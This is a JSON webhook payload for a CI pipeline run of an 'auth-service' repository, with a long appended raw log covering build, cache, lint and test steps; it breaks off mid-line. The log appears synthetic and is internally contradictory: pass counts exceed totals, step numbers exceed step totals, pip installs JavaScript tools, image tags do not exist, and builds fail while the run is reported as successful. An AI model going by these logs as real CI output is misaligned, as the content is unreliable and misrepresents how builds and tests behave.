{
  "action": "completed",
  "workflow_run": {
    "id": 386,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-800",
    "head_sha": "d5269e45a24dc2aa581af1a40cae5852ae5fbd43",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-21T12:18:42.571792Z",
    "updated_at": "2025-11-21T12:22:25.036908Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nMinifying main.js\npip: Collecting eslint\nArtifact uploaded: build.tar.gz (8MB)\nPOST /data - 201 (406ms)\nStep 17/24: Testing\nPOST /api - 200 (376ms)\nCompiling components/utils.go...\nArtifact downloaded: 40MB\nInstalling jest@3.1.9\nArtifact uploaded: build.tar.gz (35MB)\nSnapshots: 18 passed, 15 total\nWARNING: axios has known vulnerabilities\nChecking out develop branch\nPulling image: alpine:latest\nSuccess!\nSuccess!\nSnapshots: 43 passed, 15 total\nBundling main.js\nCompiling components/app.ts...\n[12:18:42] DEBUG: Initializing service\nPushing to registry...\nCache saved successfully\nTransforming 189 files...\n[12:18:42] INFO: Processing request\nCompiling lib/handler.rs...\nProcessing...\nRan 150 tests in 18s\nRan 186 tests in 49s\n  PASS: test_user_create (292ms)\n[12:18:42] DEBUG: Memory usage: 1693MB\nStep 2/24: Installing dependencies\nReady.\nCache restored successfully (389MB)\n[12:18:42] DEBUG: Memory usage: 1415MB\nCache invalidated: build\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 10/19: Linting\nUsing Node.js 14.17.10\nImage pulled successfully\nImage pulled successfully\n[12:18:42] INFO: Connecting to database\nOptimizing 46 modules...\nWaiting...\nGET /api - 204 (56ms)\n[12:18:42] WARN: Deprecated API usage\nProcessing...\nEnvironment: test\nCompiling lib/handler.rs...\n[12:18:42] DEBUG: Loading configuration\nProcessing...\nPlatform: darwin-arm64\nInstalling eslint@3.13.5\nCompiling lib/handler.rs...\nArtifact downloaded: 34MB\nTime: 53.507s\nOptimizing 85 modules...\nException: ValueError\n[12:18:42] WARN: Deprecated API usage\nException: RuntimeError\nStep 7/22: Testing\n[12:18:42] INFO: Processing request\nStep 8/22: Testing\n[12:18:42] WARN: Deprecated API usage\npip: Installing build dependencies...\nCoverage: 74% statements, 96% branches\nWaiting...\nGET /status - 201 (59ms)\nStep 13/17: Installing dependencies\nEnvironment: test\nCompiling utils/app.ts...\nUsing Python 3.12\n[12:18:42] DEBUG: Connection pool: 10 active\nEnvironment: staging\nTests: 171 passed, 236 total\n\u2717 build failed with exit code 103\nCoverage: 91% statements, 95% branches\nTime: 9.804s\nDone.\nStep 19/22: Deploying\nLoading...\npip: Collecting prettier\nCompiling components/index.js...\nReady.\nGenerating source maps...\nGenerating source maps...\nEnvironment: staging\n[12:18:42] INFO: Connecting to database\nCompiling components/index.js...\nBundling main.css\nSwitched to branch 'feature/task-831'\nCache miss for key-6568\nCache invalidated: dependencies\nFinished.\nCompiling utils/app.ts...\n[12:18:42] DEBUG: Initializing service\nVerifying...\nCreating production build...\nBundling runtime.js\nLayer 5/15: COPY command\n[12:18:42] WARN: Deprecated API usage\nUsing Node.js 16.13.5\nSuccess!\nStep 17/24: Deploying\nChecking out main branch\n=== Step deploy_staging completed ===\n=== Step: setup_node ===\nHEAD is now at c3a0557\nAlready up to date.\nTransforming 603 files...\nyarn add: Done in 8.94s\nPlatform: linux-x64\nDone.\nInstalling lodash@3.11.6\nCache miss for key-9105\n[12:18:42] INFO: Cache refreshed\nPlatform: win32-x64\nCompiling components/utils.go...\nStep 20/19: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:42] INFO: Cache refreshed\nPushing to registry...\nAlready up to date.\n[12:18:42] DEBUG: Memory usage: 563MB\nCompiling utils/handler.rs...\nStep 3/23: Deploying\nCache invalidated: build\nCache restored successfully (408MB)\n[12:18:42] WARN: Deprecated API usage\nCompleted.\nFAILED: test_api_health\nPulling image: python:latest\n[12:18:42] INFO: Starting build process\nCompiling src/index.js...\n[12:18:42] INFO: Starting build process\nFetching submodules...\nStep 20/24: Running migrations\nWARNING: jest has known vulnerabilities\nBuilding Docker image...\nCompiling lib/utils.go...\npip: Collecting lodash\nSwitched to branch 'bugfix/task-669'\nGET /status - 200 (91ms)\nArtifact uploaded: build.tar.gz (38MB)\nVerifying...\n\u2713 Step 'build' succeeded\nSuccess!\n[12:18:42] ERROR: Connection failed\nArtifact downloaded: 38MB\n  PASS: unit/test_auth_login.spec.js\nWARNING: express has known vulnerabilities\nFetching submodules...\nVerifying...\nCache invalidated: dependencies\nTests: 102 passed, 348 total\nEnvironment: development\n[12:18:42] INFO: Cache refreshed\nnpm install: resolved 1349 packages\nCache miss for key-6759\nCache invalidated: dependencies\nCompiling utils/handler.rs...\nnpm install: resolved 913 packages\n[12:18:42] DEBUG: Query executed in 97ms\n[12:18:42] DEBUG: Memory usage: 489MB\nEnvironment: development\n  PASS: test_auth_login (451ms)\nSnapshots: 24 passed, 47 total\nCache restored successfully (470MB)\nStep 20/24: Installing dependencies\nCache saved successfully\nnpm notice: created a lockfile\nSnapshots: 30 passed, 34 total\nLayer 2/12: COPY command\nCache saved successfully\nUsing Node.js 16.7.10\n  PASS: test_db_connect (29ms)\nStep 5/17: Building\n[12:18:42] INFO: Starting build process\nAlready up to date.\nPulling image: python:latest\nArtifact uploaded: dist.zip (66MB)\n\u2713 All checks passed\nOK\n[12:18:42] DEBUG: Memory usage: 1043MB\nnpm notice: package.json updated\nConnecting to startup.dev:443...\n[12:18:42] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\npip: Downloading lodash-4.17.tar.gz\nLayer 10/15: COPY command\n[12:18:42] DEBUG: Initializing service\nConnection established\n[12:18:42] DEBUG: Initializing service\n[12:18:42] INFO: Starting build process\nNODE_ENV=production\nnpm install: added 477 packages\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 17/25: Running migrations\nSnapshots: 39 passed, 10 total\nCache invalidated: build\nCompleted.\nStep 18/22: Running migrations\npip: Installing build dependencies...\n\u2717 build failed with exit code 92\n[12:18:42] DEBUG: Memory usage: 589MB\n[12:18:42] DEBUG: Memory usage: 602MB\nStep 19/15: Building\nEnvironment: staging\n[12:18:42] DEBUG: Connection pool: 14 active\nWARNING: jest has known vulnerabilities\n=== Step setup_node completed ===\n=== Step: restore_cache ===\n  PASS: test_api_health (68ms)\nStep 2/20: Linting\n[12:18:42] WARN: Deprecated API usage\nGenerating source maps...\nTest Suites: 22 passed, 48 total\nRan 165 tests in 49s\n[12:18:42] WARN: Deprecated API usage\nGenerating source maps...\nCache miss for key-1499\nAlready up to date.\nTests: 393 passed, 500 total\nStep 6/18: Testing\nMinifying vendor.js\nnpm install: added 311 packages\nException: TypeError\n\u2713 Task completed in 4992ms\n[12:18:42] INFO: Request completed\nChecking out develop branch\nCreating production build...\nFAILED: test_db_connect\n\u2713 lint completed\nStep 8/16: Deploying\nTests: 349 passed, 311 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nEnvironment: production\nStep 11/24: Building\nnpm notice: created a lockfile\n[12:18:42] INFO: Processing request\n[12:18:42] DEBUG: Memory usage: 891MB\nOK\nFinished.\nRan 78 tests in 50s\nBundling styles.js\nUploading artifact 'build' (20 files)\n[12:18:42] DEBUG: Connection pool: 8 active\n\u2713 All checks passed\n\u2713 All checks passed\nTLS handshake completed\nStep 19/23: Installing dependencies\nReady.\npip: Downloading lodash-2.19.tar.gz\nTests: 288 passed, 492 total\nCompiling src/utils.go...\nException: RuntimeError\nCache invalidated: node_modules\nCompiling lib/service.java...\nVerifying...\nStep 14/16: Running migrations\nTransforming 822 files...\nEnvironment: staging\nSuccess!\nCache miss for key-3606\nDone.\nTLS handshake completed\nUsing Python 3.10\nPushing to registry...\nVerifying...\npip: Collecting react\nCompleted.\nReady.\nCompleted.\n[12:18:42] INFO: Request completed\nTLS handshake completed\nCreating production build...\nStep 2/20: Building\nTest Suites: 34 passed, 16 total\n\u2713 All checks passed\nStep 14/25: Running migrations\n\u2717 build failed with exit code 27\nHEAD is now at 123e9d0\nFAILED: test_cache_hit\nFetching submodules...\n\u2713 Task completed in 1304ms\nTests: 454 passed, 275 total\nOptimizing 35 modules...\nCreating production build...\nnpm install: resolved 1366 packages\n[12:18:42] WARN: Deprecated API usage\nConnection established\nWARNING: eslint has known vulnerabilities\nVerifying...\nEnvironment: test\nWARNING: express has known vulnerabilities\n\u2713 Step 'checkout' succeeded\n\u2713 All checks passed\n\u2713 Task completed in 729ms\npip: Collecting jest\n  PASS: integration/test_cache_hit.spec.js\nSnapshots: 18 passed, 24 total\nPushing to registry...\nCompiling components/handler.rs...\nRan 133 tests in 19s\nCache restored successfully (242MB)\nCache hit for key-2217\nTransforming 817 files...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\nFetching submodules...\nInstalling axios@3.19.5\nFetching submodules...\nStep 12/19: Installing dependencies\nStep 3/24: Installing dependencies\nVerifying...\n[12:18:42] INFO: Cache refreshed\nMinifying main.js\n=== Step restore_cache completed ===\n=== Step: save_cache ===\npip install: Successfully installed axios-2.15\n[12:18:42] INFO: Cache refreshed\n[12:18:42] DEBUG: Connection pool: 4 active\nArtifact uploaded: dist.zip (66MB)\nChecking out main branch\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 602 packages\n[12:18:42] DEBUG: Initializing service\nStep 11/24: Running migrations\nReady.\n[12:18:42] INFO: Request completed\n[12:18:42] DEBUG: Memory usage: 1391MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:42] DEBUG: Connection pool: 19 active\nException: RuntimeError\nCache hit for key-9440\n[12:18:42] INFO: Connecting to database\n[12:18:42] INFO: Request completed\npip: Installing build dependencies...\n[12:18:42] INFO: Processing request\nCache miss for key-7005\nCache hit for key-9530\nnpm notice: package.json updated\nPlatform: linux-x64\nArtifact downloaded: 26MB\nRan 152 tests in 59s\npip: Collecting react\nTests: 220 passed, 281 total\nStep 10/18: Testing\nTransforming 655 files...\n[12:18:42] INFO: Processing request\nTest Suites: 37 passed, 48 total\nTime: 48.83s\nStep 7/18: Testing\nnpm install: added 446 packages\nSnapshots: 47 passed, 13 total\n  PASS: unit/test_db_connect.spec.js\nnpm notice: package.json updated\n[12:18:42] ERROR: Connection failed\nCoverage: 92% statements, 94% branches\nOptimizing 10 modules...\nDone.\nConnection established\nAlready up to date.\n[12:18:42] WARN: Deprecated API usage\nSuccess!\nCompiling lib/app.ts...\n[12:18:42] DEBUG: Loading configuration\n\u2713 All checks passed\n[12:18:42] DEBUG: Loading configuration\n\u2713 Task completed in 2412ms\n  PASS: test_db_connect (304ms)\npip: Collecting axios\n[12:18:42] WARN: Deprecated API usage\nCache invalidated: build\nArtifact downloaded: 27MB\nWaiting...\nVerifying...\nVerifying...\nBuilding Docker image...\nDone.\nTests: 104 passed, 126 total\nFAILED: test_auth_login\n[12:18:42] DEBUG: Loading configuration\nOK\n[12:18:42] DEBUG: Loading configuration\npip: Collecting webpack\nUploading artifact 'build' (14 files)\nTest Suites: 9 passed, 44 total\nTLS handshake completed\nFinished.\nCache saved successfully\nStep 5/15: Running migrations\nDone.\nPulling image: python:3.11\nCompiling src/service.java...\nFinished.\nCompleted.\n[12:18:42] INFO: Request completed\nCache miss for key-7093\nUsing Python 3.12\nImage pulled successfully\nnpm install: resolved 847 packages\nBundling main.js\nCache hit for key-7800\nnpm install: resolved 384 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: resolved 1445 packages\nTest Suites: 46 passed, 17 total\nTest Suites: 12 passed, 17 total\nPOST /data - 201 (63ms)\nnpm install: resolved 460 packages\npip: Collecting jest\nChecking out master branch\nUploading artifact 'build' (19 files)\npip: Installing build dependencies...\nPOST /upload - 200 (293ms)\n[12:18:42] DEBUG: Query executed in 43ms\n  PASS: integration/test_db_connect.spec.js\nLoading...\nReady.\nStep 5/21: Linting\nNODE_ENV=production\nWaiting...\n=== Step save_cache completed ===\n=== Step: build ===\nStep 19/17: Building\nConnecting to startup.dev:443...\nLayer 7/13: COPY command\nLoading...\nAlready up to date.\n[12:18:42] INFO: Connecting to database\nUploading artifact 'coverage' (39 files)\nStep 20/25: Installing dependencies\nPushing to registry...\nPOST /upload - 200 (89ms)\nnpm install: added 179 packages\nEnvironment: development\nUsing Python 3.9\n[12:18:42] DEBUG: Query executed in 11ms\n  PASS: test_db_connect (436ms)\npip install: Successfully installed lodash-1.5\nTests: 423 passed, 59 total\nStep 1/16: Running migrations\nPOST /data - 201 (301ms)\nnpm notice: created a lockfile\nFinished.\nConnecting to cloud.services:443...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 13/24: Testing\nCreating production build...\nUsing Node.js 20.17.8\nSwitched to branch 'hotfix/task-462'\nStep 19/19: Linting\nCompleted.\nTLS handshake completed\nConnecting to example.com:443...\nTransforming 607 files...\n[12:18:42] INFO: Connecting to database\nStep 9/19: Linting\nCompiling utils/handler.rs...\nCompleted.\nCompiling components/main.py...\nCoverage: 90% statements, 63% branches\nTests: 486 passed, 448 total\n[12:18:42] DEBUG: Query executed in 58ms\n[12:18:42] DEBUG: Query executed in 45ms\n[12:18:42] DEBUG: Memory usage: 1511MB\n\u2713 build completed\nRan 68 tests in 14s\nPOST /data - 201 (106ms)\n\u2713 All checks passed\nCoverage: 92% statements, 94% branches\nArtifact uploaded: build.tar.gz (2MB)\n[12:18:42] INFO: Request completed\n[12:18:42] INFO: Connecting to database\nCoverage: 90% statements, 98% branches\n\u2717 build failed with exit code 81\nAlready up to date.\nImage pulled successfully\nUsing Python 3.9\n[12:18:42] WARN: Deprecated API usage\npip install: Successfully installed axios-2.20\n\u2713 Task completed in 3141ms\nnpm notice: package.json updated\nnpm install: resolved 1413 packages\nPushing to registry...\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: created a lockfile\nCoverage: 84% statements, 100% branches\nGET /health - 201 (12ms)\nnpm notice: created a lockfile\nVerifying...\nLayer 8/11: COPY command\nCache restored successfully (298MB)\nCompiling components/main.py...\nVerifying...\nProcessing...\nPOST /api - 200 (190ms)\nBuilding Docker image...\n[12:18:42] INFO: Starting build process\nLayer 6/15: COPY command\nCompiling src/main.py...\nVerifying...\nCache restored successfully (313MB)\nTest Suites: 18 passed, 13 total\nPushing to registry...\nConnecting to example.com:443...\nPOST /data - 200 (183ms)\n[12:18:42] INFO: Connecting to database\nCache hit for key-9746\nProcessing...\nConnection established\nCompleted.\nCompleted.\nnpm notice: created a lockfile\nEnvironment: staging\nFinished.\nSuccess!\nTest Suites: 40 passed, 18 total\nReady.\nGenerating source maps...\nyarn add: Done in 29.36s\nArtifact uploaded: build.tar.gz (31MB)\nCompiling lib/index.js...\nNODE_ENV=test\nStep 16/18: Running migrations\nException: NullPointerException\n[12:18:42] INFO: Processing request\nnpm install: added 326 packages\n=== Step build completed ===\n=== Step: checkout ===\nArtifact downloaded: 35MB\nWaiting...\nPulling image: node:3.11\n[12:18:42] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (8MB)\nSwitched to branch 'hotfix/task-798'\nCoverage: 96% statements, 74% branches\n[12:18:42] INFO: Cache refreshed\nPOST /api - 200 (455ms)\nStep 6/21: Deploying\nDone.\nImage pulled successfully\nConnecting to startup.dev:443...\nCache saved successfully\nChecking out develop branch\nStep 15/19: Running migrations\nArtifact downloaded: 9MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 18 passed, 25 total\nProcessing...\nBundling runtime.js\nWARNING: webpack has known vulnerabilities\nCache restored successfully (217MB)\nWaiting...\nUsing Node.js 16.16.4\nOK\nChecking out main branch\nConnecting to acme.corp:443...\nDone.\nnpm install: added 51 packages\nCompiling components/app.ts...\nStep 11/24: Deploying\nWARNING: express has known vulnerabilities\nCompleted.\nnpm notice: created a lockfile\nCompiling components/handler.rs...\nFAILED: test_db_connect\nnpm install: added 289 packages\nWARNING: jest has known vulnerabilities\nArtifact uploaded: dist.zip (95MB)\n\u2713 Task completed in 4639ms\n\u2713 Step 'test' succeeded\nReady.\n[12:18:42] DEBUG: Query executed in 28ms\nWARNING: prettier has known vulnerabilities\nWARNING: jest has known vulnerabilities\npip: Collecting eslint\n[12:18:42] INFO: Request completed\nNODE_ENV=development\nMinifying main.js\nInstalling eslint@4.6.6\nnpm notice: package.json updated\nnpm install: resolved 1783 packages\nCompiling utils/handler.rs...\n\u2713 Task completed in 2828ms\n\u2717 build failed with exit code 82\n\u2717 build failed with exit code 12\n[12:18:42] INFO: Cache refreshed\npip install: Successfully installed eslint-2.6\n[12:18:42] ERROR: Connection failed\nDone.\nConnection established\nRan 75 tests in 5s\nNODE_ENV=development\nCompleted.\nEnvironment: test\nCoverage: 80% statements, 94% branches\nTests: 98 passed, 78 total\n[12:18:42] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGET /status - 201 (24ms)\n[12:18:42] INFO: Processing request\nSwitched to branch 'hotfix/task-752'\n[12:18:42] DEBUG: Query executed in 99ms\nStep 18/15: Running migrations\nChecking out master branch\nWARNING: lodash has known vulnerabilities\nFinished.\nArtifact uploaded: dist.zip (80MB)\nCache hit for key-6924\n[12:18:42] WARN: Deprecated API usage\n  PASS: test_db_connect (202ms)\nArtifact downloaded: 32MB\n  PASS: test_db_connect (314ms)\n[12:18:42] ERROR: Connection failed\nChecking out main branch\nLayer 6/10: ENV command\npip install: Successfully installed jest-3.19\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: dist.zip (34MB)\n[12:18:42] INFO: Request completed\nVerifying...\nOptimizing 26 modules...\n[12:18:42] WARN: Deprecated API usage\nStep 3/25: Running migrations\nnpm notice: created a lockfile\nStep 19/24: Testing\n[12:18:42] INFO: Cache refreshed\nCreating production build...\n[12:18:42] WARN: Deprecated API usage\n\u2713 build completed\n[12:18:42] INFO: Connecting to database\nHEAD is now at 6febeaa\nStep 8/24: Running migrations\n[12:18:42] WARN: Deprecated API usage\n=== Step checkout completed ===\n=== Step: upload_artifacts ===\n\u2713 test completed\nLoading...\nCompleted.\nGET /status - 201 (37ms)\nCompleted.\npip: Collecting prettier\nStep 7/17: Installing dependencies\nnpm install: resolved 1249 packages\nCoverage: 86% statements, 75% branches\n[12:18:42] DEBUG: Query executed in 23ms\nLayer 8/13: ENV command\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\n\u2713 package completed\nFinished.\nSnapshots: 0 passed, 31 total\nFAILED: test_auth_login\nConnection established\nFinished.\nTests: 305 passed, 193 total\nBuilding Docker image...\nInstalling prettier@5.9.1\nFetching submodules...\n[12:18:42] DEBUG: Memory usage: 1241MB\n[12:18:42] DEBUG: Connection pool: 6 active\nCache saved successfully\nTLS handshake completed\nPOST /upload - 200 (154ms)\npip: Collecting prettier\nBundling main.js\nProcessing...\nArtifact uploaded: build.tar.gz (19MB)\nStep 1/24: Running migrations\nnpm install: added 421 packages\nPlatform: linux-x64\n[12:18:42] INFO: Connecting to database\nEnvironment: development\nProcessing...\n[12:18:42] WARN: Deprecated API usage\n\u2717 build failed with exit code 95\nWaiting...\nWARNING: prettier has known vulnerabilities\nGenerating source maps...\nCompiling lib/main.py...\nCompiling src/app.ts...\nCache restored successfully (463MB)\nUsing Python 3.9\nArtifact uploaded: dist.zip (56MB)\nCompiling lib/app.ts...\n  PASS: e2e/test_user_create.spec.js\n\u2713 Task completed in 4709ms\nCache restored successfully (209MB)\nFinished.\n[12:18:42] DEBUG: Loading configuration\nAlready up to date.\nCache restored successfully (258MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:42] INFO: Cache refreshed\nBundling main.js\nyarn add: Done in 20.13s\nPushing to registry...\n  PASS: test_cache_hit (26ms)\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (48MB)\nCache restored successfully (368MB)\nAlready up to date.\nTime: 30.199s\nArtifact uploaded: build.tar.gz (41MB)\nBundling main.js\nnpm notice: created a lockfile\npip: Downloading eslint-4.3.tar.gz\nStep 14/22: Installing dependencies\nBuilding Docker image...\n\u2717 build failed with exit code 56\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact downloaded: 32MB\nBuilding Docker image...\nCompiling components/service.java...\nHEAD is now at b171806\nInstalling react@1.11.6\nCoverage: 87% statements, 81% branches\nReady.\n[12:18:42] ERROR: Connection failed\nWaiting...\nChecking out main branch\nSnapshots: 42 passed, 38 total\npip install: Successfully installed webpack-3.6\n[12:18:42] DEBUG: Connection pool: 9 active\n\u2717 build failed with exit code 48\nVerifying...\nPOST /upload - 200 (444ms)\nTime: 62.374s\nTest Suites: 30 passed, 6 total\nPlatform: linux-x64\nWaiting...\nTime: 89.437s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nNODE_ENV=development\nTests: 277 passed, 88 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nReady.\n[12:18:42] INFO: Starting build process\n  PASS: test_api_health (89ms)\nCache invalidated: dependencies\n=== Step upload_artifacts completed ===\n=== Step: install_dependencies ===\nWARNING: express has known vulnerabilities\nCompiling utils/app.ts...\nCreating production build...\nFetching submodules...\nWARNING: jest has known vulnerabilities\nCompiling src/index.js...\n[12:18:42] DEBUG: Connection pool: 19 active\n[12:18:42] INFO: Connecting to database\n  PASS: test_cache_hit (110ms)\nUsing Node.js 14.12.7\nSwitched to branch 'bugfix/task-606'\nnpm install: resolved 898 packages\nVerifying...\npip: Collecting eslint\nTest Suites: 10 passed, 16 total\nArtifact uploaded: dist.zip (68MB)\nCache invalidated: build\npip: Installing build dependencies...\nEnvironment: production\nUploading artifact 'coverage' (18 files)\nArtifact uploaded: dist.zip (34MB)\n  PASS: e2e/test_cache_hit.spec.js\nStep 10/24: Installing dependencies\nArtifact downloaded: 28MB\nPulling image: python:18\n\u2713 All checks passed\nTests: 187 passed, 443 total\npip: Downloading webpack-2.18.tar.gz\nCreating production build...\n[12:18:42] INFO: Starting build process\n[12:18:42] WARN: Deprecated API usage\n[12:18:42] DEBUG: Initializing service\nBuilding Docker image...\nFetching submodules...\n\u2713 package completed\nReady.\nAlready up to date.\nUploading artifact 'coverage' (15 files)\nStep 15/20: Running migrations\nPushing to registry...\nnpm install: added 113 packages\nAlready up to date.\nyarn add: Done in 17.65s\nTest Suites: 24 passed, 47 total\n[12:18:42] INFO: Cache refreshed\nCreating production build...\nLayer 7/9: COPY command\nAlready up to date.\nnpm notice: package.json updated\nSnapshots: 28 passed, 42 total\nSnapshots: 21 passed, 14 total\nUsing Node.js 20.10.4\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Downloading react-4.12.tar.gz\nTests: 373 passed, 55 total\nWARNING: eslint has known vulnerabilities\nLoading...\npip install: Successfully installed prettier-2.17\nGET /health - 204 (40ms)\nCoverage: 87% statements, 74% branches\nReady.\n\u2713 Step 'setup' succeeded\nUsing Python 3.9\n[12:18:42] DEBUG: Initializing service\nnpm notice: package.json updated\n[12:18:42] INFO: Starting build process\nFetching submodules...\nArtifact uploaded: dist.zip (2MB)\nTests: 209 passed, 429 total\nBuilding Docker image...\nProcessing...\nWARNING: axios has known vulnerabilities\n\u2713 Task completed in 3964ms\nStep 11/16: Linting\nInstalling express@2.3.2\nCache restored successfully (190MB)\nCache restored successfully (267MB)\n[12:18:42] WARN: Deprecated API usage\n  PASS: integration/test_user_create.spec.js\nnpm install: added 461 packages\nWARNING: jest has known vulnerabilities\nStep 20/19: Linting\n\u2713 Task completed in 3897ms\nRan 43 tests in 52s\nDone.\nCompiling lib/service.java...\nnpm install: added 472 packages\nRan 92 tests in 35s\nChecking out main branch\n[12:18:42] ERROR: Connection failed\nLoading...\nCompleted.\nAlready up to date.\nWARNING: jest has known vulnerabilities\nEnvironment: staging\nCache invalidated: build\npip install: Successfully installed express-3.16\nCoverage: 99% statements, 92% branches\n  PASS: test_cache_hit (140ms)\nUploading artifact 'build' (27 files)\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_api_health (220ms)\nStep 18/18: Building\nnpm notice: package.json updated\n=== Step install_dependencies completed ===\n=== Step: lint ===\nTime: 113.666s\nLoading...\nStep 13/21: Deploying\n[12:18:42] DEBUG: Initializing service\n  PASS: test_user_create (394ms)\nVerifying...\nCache invalidated: node_modules\nChecking out main branch\nCache miss for key-5895\nWARNING: express has known vulnerabilities\n[12:18:42] INFO: Cache refreshed\nTLS handshake completed\nWARNING: axios has known vulnerabilities\n[12:18:42] INFO: Cache refreshed\npip: Downloading axios-5.0.tar.gz\nTests: 359 passed, 82 total\nException: RuntimeError\nStep 7/25: Testing\nGenerating source maps...\nUploading artifact 'build' (7 files)\nImage pulled successfully\nCache invalidated: node_modules\nUploading artifact 'build' (41 files)\nEnvironment: staging\nStep 3/25: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCreating production build...\n[12:18:42] ERROR: Connection failed\nWaiting...\nException: ValueError\nDone.\nCompiling utils/handler.rs...\nMinifying main.js\nTLS handshake completed\nStep 5/19: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSwitched to branch 'bugfix/task-987'\nRan 60 tests in 39s\nConnecting to cloud.services:443...\nSwitched to branch 'feature/task-318'\n[12:18:42] DEBUG: Connection pool: 14 active\nCompleted.\nRan 136 tests in 10s\n[12:18:42] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (31MB)\nCreating production build...\nImage pulled successfully\nPOST /data - 202 (426ms)\n[12:18:42] ERROR: Connection failed\n\u2713 All checks passed\n[12:18:42] INFO: Connecting to database\nPOST /data - 201 (28ms)\nFetching submodules...\nnpm notice: created a lockfile\n\u2713 All checks passed\nnpm notice: created a lockfile\n[12:18:42] WARN: Deprecated API usage\nCompleted.\npip: Downloading react-2.11.tar.gz\n\u2713 Step 'install' succeeded\n\u2717 build failed with exit code 106\n\u2713 All checks passed\nTime: 19.481s\nChecking out main branch\n[12:18:42] INFO: Connecting to database\nStep 2/23: Deploying\n\u2713 All checks passed\n[12:18:42] WARN: Deprecated API usage\npip: Collecting jest\nChecking out master branch\nInstalling prettier@4.19.5\nEnvironment: production\nCache saved successfully\nOptimizing 13 modules...\nWARNING: axios has known vulnerabilities\n[12:18:42] INFO: Processing request\nCache invalidated: node_modules\nTests: 258 passed, 340 total\nHEAD is now at eedd18e\nProcessing...\nFAILED: test_api_health\nConnection established\nVerifying...\nStep 7/17: Linting\n[12:18:42] DEBUG: Loading configuration\nConnecting to cloud.services:443...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/app.ts...\nStep 8/21: Testing\nTests: 210 passed, 485 total\nImage pulled successfully\n[12:18:42] INFO: Starting build process\nyarn add: Done in 13.83s\nStep 6/25: Deploying\nRan 89 tests in 44s\nCompiling components/index.js...\npip: Installing build dependencies...\nVerifying...\n[12:18:42] DEBUG: Loading configuration\n[12:18:42] WARN: Deprecated API usage\nConnecting to acme.corp:443...\n\u2713 Step 'build' succeeded\nCache hit for key-9849\nAlready up to date.\nyarn add: Done in 3.68s\n=== Step lint completed ===\n=== Step: e2e_tests ===\nUsing Node.js 16.9.0\nFAILED: test_db_connect\n[12:18:42] INFO: Request completed\nArtifact uploaded: dist.zip (54MB)\npip: Collecting lodash\n[12:18:42] WARN: Deprecated API usage\nWARNING: webpack has known vulnerabilities\nReady.\nChecking out main branch\nTLS handshake completed\nFetching submodules...\nnpm install: added 465 packages\nCache miss for key-3463\nWARNING: axios has known vulnerabilities\nConnecting to acme.corp:443...\nStep 10/19: Building\nGET /status - 200 (48ms)\n[12:18:42] WARN: Deprecated API usage\nAlready up to date.\nSnapshots: 13 passed, 20 total\nAlready up to date.\nConnecting to test.io:443...\nCompleted.\n\u2713 package completed\nCompiling utils/app.ts...\nStep 9/22: Building\n[12:18:42] WARN: Deprecated API usage\nInstalling prettier@4.16.3\n[12:18:42] DEBUG: Memory usage: 547MB\n  PASS: test_api_health (246ms)\nConnection established\nWARNING: jest has known vulnerabilities\nWaiting...\n[12:18:42] ERROR: Connection failed\nImage pulled successfully\n[12:18:42] WARN: Deprecated API usage\nCompiling components/service.java...\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling utils/app.ts...\nCache saved successfully\nCompiling src/handler.rs...\nTest Suites: 32 passed, 46 total\nOptimizing 56 modules...\nStep 18/15: Testing\nTests: 327 passed, 140 total\nHEAD is now at 6069738\nTransforming 910 files...\n[12:18:42] INFO: Processing request\n[12:18:42] DEBUG: Connection pool: 1 active\nArtifact uploaded: dist.zip (9MB)\n[12:18:42] INFO: Request completed\nFinished.\npip: Downloading axios-2.15.tar.gz\nHEAD is now at a8b7143\n[12:18:42] INFO: Connecting to database\nCache restored successfully (297MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling components/app.ts...\nWARNING: jest has known vulnerabilities\n\u2713 lint completed\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:42] DEBUG: Query executed in 81ms\nStep 20/16: Deploying\nGenerating source maps...\npip: Downloading axios-1.16.tar.gz\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed webpack-4.15\nStep 14/22: Running migrations\nReady.\nCache saved successfully\nTests: 79 passed, 222 total\nnpm notice: package.json updated\nCompiling lib/app.ts...\nArtifact downloaded: 16MB\nnpm install: resolved 857 packages\nVerifying...\nOptimizing 91 modules...\nAlready up to date.\nHEAD is now at e299d56\nnpm notice: created a lockfile\nInstalling prettier@3.13.0\nReady.\nConnection established\nLayer 